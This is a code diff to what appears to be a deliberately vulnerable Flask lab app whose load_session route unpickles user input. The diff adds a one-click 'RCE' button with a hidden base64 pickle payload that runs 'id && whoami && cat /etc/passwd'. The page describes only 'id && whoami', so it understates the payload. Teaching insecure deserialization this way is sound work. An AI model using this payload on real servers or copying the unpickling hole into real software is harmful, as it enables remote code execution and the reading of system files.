@@ -33,9 +33,16 @@ def index():
         <button type="submit">Load Session</button>
     </form>
     <hr>
-    <h3>공격 방법</h3>
-    <p>exploit.py를 실행하여 악성 pickle 페이로드를 생성하세요.</p>
-    <pre>python exploit.py</pre>
+    <h3>RCE 공격 테스트</h3>
+    <p>아래 버튼을 클릭하면 서버에서 <code>id && whoami</code> 명령이 실행됩니다.</p>
+    <form action="/load_session" method="POST">
+        <input type="hidden" name="session_data"
+               value="Y3Bvc2l4CnN5c3RlbQooUydpZCAmJiB3aG9hbWkgJiYgY2F0IC9ldGMvcGFzc3dkJwp0Ui4=">
+        <button type="submit" style="background:red;color:white;padding:10px 20px;cursor:pointer;">
+            Exploit: RCE 실행 (서버 로그 확인)
+        </button>
+    </form>
+    <p><small>결과는 서버 로그에 출력됩니다: <code>docker-compose logs vulnerable</code></small></p>
     """
 
 
@@ -60,7 +67,7 @@ def save_session():
 @app.route("/load_session", methods=["POST"])
 def load_session():
     """취약점: 사용자 입력을 pickle.loads()로 역직렬화"""
-    session_data = request.form.get("session_data", "")
+    session_data = request.form.get("session_data", "").strip()
 
     try:
         # 취약한 코드 - 신뢰할 수 없는 데이터를 pickle.loads()
